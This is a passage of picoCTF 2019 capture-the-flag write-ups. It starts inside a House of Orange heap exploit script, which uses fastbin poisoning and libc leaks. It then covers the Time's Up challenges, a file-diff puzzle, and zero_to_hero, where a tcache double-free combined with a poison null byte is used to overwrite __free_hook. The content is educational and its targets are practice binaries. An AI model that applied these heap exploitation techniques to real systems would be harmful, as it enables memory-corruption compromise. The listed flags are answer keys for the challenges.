0x602110:    0x0000000000000000    0x0000000000000000
0x602120:    0x0000000000000000    0x0000000000000000
0x602130:    0x0000000000000000    0x0000000000000041
"""
# THE LAST CHAR IS REMOVED BECAUSE IT WILL BECOME \n
payload1 = str2payload(m1)[:-1]


# Because creams is directly below name in memory, we use double free fastbin
# poisoning to get the chunk at RETME, which we can use to write SMALLBIN to
# creams[0].
RETME = 0x602130
SMALLBIN = 0x602050
SZ = 56

# Standard double free to coerce malloc to return RETME
buy("", SZ)
# We also need to leak a heap address, and we can do that right after our
# first malloc. By filling name with non-NULL bytes we get rename to leak
# creams[0] and thus calculate HEAPBASE.
flush()
rename("A"*255)
data = flush()
# Note: leak2addr will FAIL if our HEAPBASE happens to have a NULL byte in it.
# If so, we can just run again.
HEAPBASE = leak2addr(data.split('\n')[1][:-1]) - 0x10
print "=== LEAKED HEAPBASE: {0} ===".format(hex(HEAPBASE))

# Put the contents of m1 into name, including our smallbin chunk and the chunk
# above as well as a chunk in between to pass the corruption checks.
rename(payload1)

# Continue the double free
buy("", SZ)
buy("", SZ)
eat(0)
eat(1)
eat(0)
# Poison the fastbin fd pointer
buy(p64(RETME),SZ)
buy("",SZ)
# (We will use this chunk (at HEAPBASE + 0x10) later)
buy(p64(PRINT_FILE)*5,SZ)
# This malloc will now give us the chunk at RETME, so we can write the address
# of our smallbin chunk into creams[0].
buy(p64(SMALLBIN),SZ)

# Free the fake smallbin chunk
eat(0)

# Leak libc with rename. We fill the first 16 bytes with non-NULL because the
# libc address begins at byte 17
flush()
rename("AAAABBBBCCCCDDD")
data = flush()

# Calculate critical offsets
LEAKED = leak2addr(data.split('\n')[1][:-1])
LIBC_BASE = LEAKED - 0x3a4438
IOLISTALL = LIBC_BASE + 0x3a4de0
print "=== LEAKED LIBC: {0} ===".format(hex(LIBC_BASE))
print "=== _IO_list_all: [{0}] ===".format(hex(IOLISTALL))

# Set up house of orange exploit. Our vtables address will point to the chunk we
# allocated earlier (at HEAPBASE + 0x10), which we filled with the address of
# print_file.
m2 = """
0x602040:    0x7478742e67616c66    0x0000000000000100
0x602050:    0x0000000000000000    {0}
0x602060:    0x0000000000000000    0x0000000000000061
0x602070:    0x0000000000000000    0x0000000000000000
0x602080:    0x0000000000000000    0x0000000000000000
0x602090:    0x0000000000000000    0x0000000000000000
0x6020a0:    0x0000000000000000    0x0000000000000000
0x6020b0:    0x0000000000000000    0x0000000000000000
0x6020c0:    0x0000000000000000    0x0000000000000000
0x6020d0:    0x0000000000000000    0x0000000000000000
0x6020e0:    0x0000000000000000    0x0000000000000000
0x6020f0:    0x0000000000000000    0x0000000000000000
0x602100:    0x0000000000000000    0x0000000000000061
0x602110:    0x0000000000000000    {1}
0x602120:    0x0000000000000000    0x0000000000000000
0x602130:    0x0000000000000000    0x0000000000000000
""".format(hex(IOLISTALL-16), hex(HEAPBASE+0x10))
payload2 = str2payload(m2)[:-1]
rename(payload2)

p.interactive()
# Now, we just buy a 0x58 (88), which will trigger our HoO chain and flag us!
# Note: due to alignment issues we will not always get a flag from this.
# If it fails, just run again
```
After running a few times, we get our flag, a quite fitting comment:
> `flag{th3_r3al_questi0n_is_why_1s_libc_2.23_still_4_th1ng_19e46be4}`



### File: picoCTF-2019-writeups/problems/times-up-again/README.md

# Time's Up Again

> Previously you solved things fast. Now you've got to go faster. Much faster. Can you solve *this one* before time runs out? [times-up-again](times-up-again), located in the directory at ``/problems/time-s-up--again-_0_ba1fe87bd4905d3f34eb83d66f907fe0``.

> Hints: Sometimes, scripts are just too slow. You've got to have much more control.

In spite of the hint, it turns out scripts are fast enough, with some optimizations. Upon opening the challenge, we are greeted with a very similar run of text.
```
Challenge: (((((2028325709) + (674163678)) * ((1611206565) * (215980341))) * (((824932500) * (-742149897)) + ((954247263) + (-2098073143)))) - ((((-639264993) + (-1377601293)) + ((-1704616670) - ((-473516344) + (893927024)))) * (((-1236496098) * (1228643134)) * ((652120780) - (1679126213)))))
Setting alarm...
Solution? Alarm clock
```
In an attempt to not actually solve the problem, we instead first attempt to just optimize the script. First, we use ``subprocess`` instead of ``pwntools`` if for no other reason than it allows us to call ``p.stdout.readline()`` for the first line and then immediately send back the response. Second, we turn on our code golf and magic numbers and take in the input to the challenge and output it back in the same line in order to avoid setting variables. Some of this might have been optimized away by the compiler, but ``python3`` generally does not try too hard to speed up programs during interpretation.

But finally, we have to apply ``% (1 << 64)`` to the answer. The reason for this is a bit subtle, but the original program was likely written in a language that does not implicitly support arbitrary-percision integers, such as the ``python3`` we are scripting in. And checking the binary, it is only 64-bit:
<pre>
times-up-again: setgid ELF <b>64-bit</b> LSB shared object ...
</pre>
Thus, any integer we want to pass into the program we should turn back into 64-bit, and the easiest way to do this is by manually modding out the more significant bits. Even though this might give us a positive answer when the program thinks it should be negative, or give us a negative answer when the program wants it positive, we'll get it right about half the time.

With all of that said, here is the script. As promised, it uses ``subprocess`` and is not at all written for readability. Comments were added after.
```python3
import subprocess

# Run in /problems/time-s-up--again-_0_ba1fe87bd4905d3f34eb83d66f907fe0
p = subprocess.Popen(['./times-up-again'],stdout=-1,stdin=-1,stderr=-1)
p.stdin.write(bytes(str(eval(p.stdout.readline()[10:]) & 18446744073709551615,'utf-8') + b'\n')
#                            receive the challenge; chop off 'Challenge: '
#                       evaluate the challenge and mod by 1 << 64
#                       note (1<<64)-1 = 18446744073709551615, so we bitwise &
#             and send the answer through
p.stdin.flush()
for i in range(4): print(p.stdout.readline())
```
After running a few times (it works somewhat reliably), we are greeted with the flag.
> ``picoCTF{Hasten. Hurry. Ferrociously Speedy. #16462951}``



### File: picoCTF-2019-writeups/problems/times-up-for-the-last-time/README.md

# Time's Up, for the Last Time!

> You've solved things fast. You've solved things faster! Now do the impossible. [times-up-one-last-time](times-up-one-last-time), located in the directory at /problems/time-s-up--for-the-last-time-_1_a7830af9d51a361ee5d3b9eece69c22f.

> Hints: Some times, if some approach seems impossible, it means a different perspective might be needed. Is there anything interesting about how the program behaves?

Upon opening the program, we are greeted with the following by-now-familiar set of text.
```
Challenge: (((((931684457) x (-141199422)) | ((-2112115878) - (150425815))) - ((((554752943) | (409636616)) * ((-551976236) o (446132558))) * ((-216677243) x (462203675)))) - ((((-1802665975) r (-2089095274)) + ((-1538299143) o (1410099799))) + (((767697014) | (75366479)) | ((656800643) | (-1002949848)))))
Setting alarm...
Solution? Alarm clock
```
This time around there appear to be a bunch of random characters to evaluate through. To figure these out, we will actually have to dig  into the program this time.

Decompiling the program (say, with ghidra) and poking around for a bit reveals the main function as follows.
```c
int main() {
	init_randomness();
	printf("Challenge: ");
	generate_challenge();
	putchar('\n');
	fflush(stdout);
	puts("Setting alarm...");
	fflush(stdout);
	ualarm(10,0);
	printf("Solution? ");
	scanf("%lld", &guess);
	if (guess == result) {
		puts("Congrats! Here is the flag!");
		system("/bin/cat flag.txt");
	}
	else {
		puts("Nope!");
	}
	return 0;
}
```
The key line for the alarm, of course, is ``ualarm(10,0)``, which sets the alarm to go off in no less than *10 microseconds*. The python script for the previous challenge was a bit iffy on its timing performance, and we can go back to check that the alarm was set for 200 microseconds, so it appears pretty impossible for any script to solve this one.

We could sift through the challenge generation, but it is largely unimportant; the real key to solving this one is finding away to deal with the time constraint. To show how extreme 10 microseconds is, we can try to manually insert fixed input into the program on the shell, and we still never get past the alarm.
```bash
user@pico-2019-shell1:~$ /problems/time-s-up--for-the-last-time-[...]/times-up-again <<< '\n'
Challenge: ...
Setting alarm...
Alarm clock
```
As a sidenote, while the above never succeeds on the server, it does occasionally when run locally, and in fact, it sometimes is even correct, a shocking proportion of the time (say, more than 1 in 20).
```bash
$ ./times-up-one-last-time <<< '\n'
Challenge: ...
Setting alarm...
Solution? Congrats! Here is the flag!
Alarm clock
```
So if it is impossible to even get input into the program in 10 microseconds, then the only way to solve this challenge will have to bypass the alarm, which signals SIGALRM. Upon hint from an admin, we realized that (roughly) the same techniques that ignore the alarms in gdb can also ignore the time alarm when communicating with the program normally.

The following C program opens a session with the file in which the alarm is ignored.
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>

int main() {
	signal(SIGALRM, SIG_IGN);
	system("./times-up-one-last-time");
}
```
Now that we're able to get input into the program, we can return to the idea of literally only inserting a new line and sometimes retrieving the flag. (There are interesting reasons this occurs, but they largely don't matter. In short, the answer is frequently 0 depending on the structure of the challenge, and no input as in ``\n`` is read in as 0.) Running the above C program enough times with just spamming an input of ``0`` will eventually retrieve the flag. Here's a quick bash script that will do the job.
```bash
#!/bin/bash

# To be run in /problems/time-s-up--for-the-last-time-_1_a7830af9d51a361ee5d3b9eece69c22f
for i in {1..1000..1};
do
	(exploit <<< '\n') | grep "picoCTF{.*}";
done
```
And so we have our flag.
> ``picoCTF{And now you can hack time! #2e0a37d1}``



### File: picoCTF-2019-writeups/problems/times-up/README.md

# Time's Up

> Time waits for no one. Can you solve this before time runs out? [times-up](times-up), located in the directory at ``/problems/time-s-up_1_7d4f79c3df3e1b044801573eea5722be``.

> Hints: Can you interact with the program using a script?

Upon running the program, we are treated with the very fast run of text.
```
Challenge: (((((-2126372103) - (225877768)) + ((-1551135096) + (1471356896))) + (((686165910) + (-1245290406)) + ((-995861592) + (1815320614)))) - ((((-940484744) + (-1249322894)) + ((284597278) + (1704808354))) - (((462451468) + (833169926)) + ((-1467212263) + (-2138574505)))))
Setting alarm...
Solution? Alarm clock
```
Along with the challenge name, description, and key phrase ``Alarm clock``, it looks like the goal of this question is to solve the challenge before some alarm finishes.

And as the hint suggests, this can be easily accomplished using a script.
```python3
from pwn import *
from time import sleep

# Run in /problems/time-s-up_1_7d4f79c3df3e1b044801573eea5722be
p = process('./times-up')

# Receive the challenge
chall = p.recv(4096)
# Chop off the unnecessary text
chall = chall[len('Challenge: '):chall.index('\n')]
# eval and send it through
p.sendline(str(eval(chall)))

print p.recv(4096) # Here is the flag:
print p.recv(4096) # Actual flag
```
Running the above gives us our flag.
> ``picoCTF{Gotta go fast. Gotta go FAST. #3daa579a}``



### File: picoCTF-2019-writeups/problems/whats-the-difference/README.md

# whats-the-difference

> Can you spot the difference? [kitters](kitters.jpg) [cattos](cattos.jpg). They are also available at /problems/whats-the-difference_0_00862749a2aeb45993f36cc9cf98a47a on the shell server

> Hints: How do you find the difference between two files? Dumping the data from a hex editor may make it easier to compare.

The title, challenge description, and hints all suggest that we want to check for where the files are different. We could use a hex editor, but python works fine.
```python3
>>> k = open('kitters.jpg','rb').read()
>>> c = open( 'cattos.jpg','rb').read()
```
At this point, we blindly run a byte-by-byte comparison of the two files.
```python3
>>> [(k[i], c[i]) for i in range(len(k)) if k[i] != c[i]]
[(153, 112), (157, 105), (152, 99), (200, 111), (10, 67), (244, 84), ...
```
Recalling that "p" evaluates to ``112`` with ASCII, we are inspired to attempt to extract the flag entirely from cattos, and we are thankfully granted the flag.
```python3
>>> ''.join(chr(c[i]) for i in range(len(k)) if k[i] != c[i])
'picoCTF{th3yr3_a5_d1ff3r3nt_4s_bu773r_4nd_j311y_aslkjfdsalkfslkflkjdsfdszmz10548}'
```
> ``picoCTF{th3yr3_a5_d1ff3r3nt_4s_bu773r_4nd_j311y_aslkjfdsalkfslkflkjdsfdszmz10548}``



### File: picoCTF-2019-writeups/problems/zero_to_hero/README.md

# zero_to_hero
> Now you're really cooking. Can you pwn this service?. Connect with nc 2019shell1.picoctf.com 45180. libc.so.6 ld-2.29.so

> Hints:
> Make sure to both files are in the same directory as the executable, and set LD_PRELOAD to the path of libc.so.6

In one sentence, this exploit is tcache poison triggered by a poison null byte to gain arbitrary write.

As the first step always is, we begin by reversing the binary with ghidra. The reversed code can be found in [zero_to_hero.c](zero_to_hero.c).

Before continuing, we note that there is a hidden ``win()`` function that is referenced nowhere else in the program. It simply prints out the flag from the file ``flag.txt``.

With the ``malloc``s thrown everywhere, this is a heap exploitation problem, so it's time to look for heap exploits. The first bug in this program is reasonably obvious, and it lives in the deletion.
```c
// Blindly frees the requested pointer
void do_remove() {
	unsigned int choice = 0;
	puts("Which power would you like to remove?");
	printf("> ");
	scanf("%u",&choice);
	getchar();
	if (6 < choice) {
		puts("Invalid index!");
		exit(-1);
	}
	free(powers[choice]); // It doesn't null out the pointer!
	return;
}
```
Notably, the pointers stay even after a chunk gets freed, which means we can in theory free a chunk twice to trigger double-free.

However, simply attempting to free power 0, free power 1, and free power 0 again will fail, and the reason for this is that we are using libc 2.29. Indeed, we are greeted with the following error message:
```
free(): double free detected in tcache
```
How dissappointing.

We quickly review how tcache operates here. In brief, tcache stores many linked lists of freed chunks for each size from ``0x20`` up to the maximum that we can allocate in the program. Whenever a chunk is freed of, say, size ``0x60`` is freed, the pointer stored in tcache corresponding to the linked list of freed chunks of size ``0x60`` gets thrown into the metadata of the freed chunk. So before the freeing, the heap might look like:
```
[tcache]: 0x0000000000000000 0x0000000000000251 <- size of tcache
          ...
          0xPOINTER FOR 0x60 0xPOINTER FOR 0x70
          ...
[chunk] : 0x0000000000000000 0x0000000000000061 <- top of the chunk stores size metadata
          0xdaedbeefdeadbeef 0xdeadbeefdeadbeef <- actual user data
          ...
```
And now we free the ``[chunk]`` of size ``0x60``, so the heap looks like
```
[tcache]: 0x0000000000000000 0x0000000000000251
          ...
          0xPOINTER TO chunk 0xPOINTER FOR 0x70
          ...
[chunk] : 0x0000000000000000 0x0000000000000061
          0xPOINTER FOR 0x60 0xdeadbeefdeadbeef <- now the pointer to the next 0x60 lives here
          ...                                      naturally, this was the pointer in tcache
```
This will grow a linked list of chunks of size ``0x60`` in which tcache stores the head, and the first freed chunk of size ``0x60`` stores a null byte ``0x0``. And conversely, whenever a chunk of size ``0x60`` is requested by malloc, tcache simply hands back the pointer that it has stored for that size and takes back the pointer stored in the metadata of the freed chunk. In theory, this pointer in the metadata points to the next freed chunk if the linked list is operating properly, so we have simply shrunk the linked list of freed chunks of size ``0x60`` by removing the element directly after the head in tcache. Essentially, it is the earlier described process, in reverse.

That's what happens when things are working correctly. Two things about tcache are worthy of note: First, there are no checks when tcache returns a pointer to malloc. If we can corrupt the tcache, then when malloc asks for a chunk of some size, malloc will simply let us write with whatever corrupted pointers are stored in tcache. And second, the only protection that tcache has against double-free is that it makes sure the current chunk being freed is different from all chunks freed earlier _of the same size._

With this freeing check in mind, it makes sense that we got the above double-free detected: If superpower ``0`` was a chunk of size ``0x110`` (say), then freeing it once adds the pointer into tcache's linked list of freed chunks of size ``0x110``, but then freeing it again of course doesn't pass the check. After all, the pointer already lives on the freed linked list, so tcache's linked list check on chunks of size ``0x110`` will declare an error and abort.

The key observation, now, is that tcache is only checking chunks of the same size against each other. Because the pointers are maintained, all intuition points towards trying to somehow get a double-free exploit working, but we can't free a chunk of the same size twice. The solution? We convince tcache that the same chunk has two different sizes.

This brings us to the second bug in the program, and it lives in the writing.
```c
	puts("Enter your description: ");
	printf("> ");
	ssize_t amt = read(0, powers[num_powers], size);
	powers[num_powers][amt] = '\x00';

	puts("Done!");
	return;
```
There is a subtle but dangerous off-by-one error here. In particular, when reading into the text for the superpower, it lets us write tons of characters, and then it wil append a null byte to the end of whatever we have written. However, if we asked for, say, ``40`` bytes to write in, then we will get to write ``40`` characters, and then the null byte will be placed outside of the current chunk.

To exploit this, we return to the earlier idea of trying to convince tcache that one chunk has two different sizes. Let's suppose that the heap (excluding the memory given to tcache) currently looks something like this:
```
[chunk 1]: 0x0000000000000000 0x0000000000000031 <- top of the chunk stores size metadata
           0x0000000000000000 0x0000000000000000 <- actual space for user data
           0x0000000000000000 0x0000000000000000
[chunk 2]: 0x0000000000000000 0x0000000000000111 <- the next chunk's metadata
           ...
```
If we free chunk 2 now, tcache will see that it has size ``0x110`` (of course ignoring the ``prev_in_use`` bit) and then store a pointer to chunk 2 inside of the tcache linked list of freed chunks of size ``0x110``.

Now, suppose we write into chunk 1 to the brim, and as discussed before, it will write the null byte ``0x00`` into the next chunk. Before writing the null byte, the haep looks like this:
```
[chunk 1]: 0x0000000000000000 0x0000000000000031
           0xdaedbeefdeadbeef 0xdaedbeefdeadbeef
           0xdaedbeefdeadbeef 0xdaedbeefdeadbeef
[chunk 2]: 0xdaedbeefdeadbeef 0x0000000000000111
           ...
```
And now the program writes in the null byte, so the heap looks like this:
```
[chunk 1]: 0x0000000000000000 0x0000000000000031
           0xdaedbeefdeadbeef 0xdaedbeefdeadbeef
           0xdaedbeefdeadbeef 0xdaedbeefdeadbeef
[chunk 2]: 0xdaedbeefdeadbeef 0x0000000000000100 <- poison null byte!
           ...
```
Uh-oh: We've overwritten the size metadata for chunk 2! So if we free chunk 2 again, tcache will store the second chunk inside of the linked list of freed chunks of size ``0x100`` because that's what the chunk says its size is. We have now successfully bypassed the tcache check to obtain a double-free, once for freeing into the ``0x110`` linked list, and a second time for freeing into the ``0x100`` linked list.

It turns out that this idea is possible in the given program, albeit with a bit of phenangling in order to write to a chunk above another chunk. This can be done by first requesting the ``0x30``, requesting the ``0x110``, then freeing the ``0x30`` and then asking for it again.

Before continuing, we remark again that malloc does no checks on the pointer that tcache gives it: If tcache hands malloc a pointer, then malloc will return that pointer immediately. Thus, atypical with most double-frees, not only can we write any pointer into tcache (this is a part of the double-free exploit, which I will not explain here), we can also coerce malloc into letting us write to that pointer's location, with no intermediate checks. This is the most arbitrary write possible.

The rest of the attack is just a matter of figuring out where to write. After sufficient frustration and googling, we find the pointer ``__free_hook``, stored in a writable area of libc. (Briefly note that we have a libc address leaked by the program directly---they give us system.) The pointer ``__free_hook`` simply redirects the actions of ``free`` to whatever function ``__free_hook`` happens to point to, so rewriting ``__free_hook`` will make ``free`` call an arbitrary function. Well, what better function to overwrite ``__free_hook`` with than the literal ``win()`` function mentioned at the beginning. Doing so will finish the problem.

The final exploit code can be found in [exploit.py](exploit.py). And with that, the flag is
> ``picoCTF{i_th0ught_2.29_f1x3d_d0ubl3_fr33?_pramlxuc}``

No, libc 2.29 did not fix double-free.

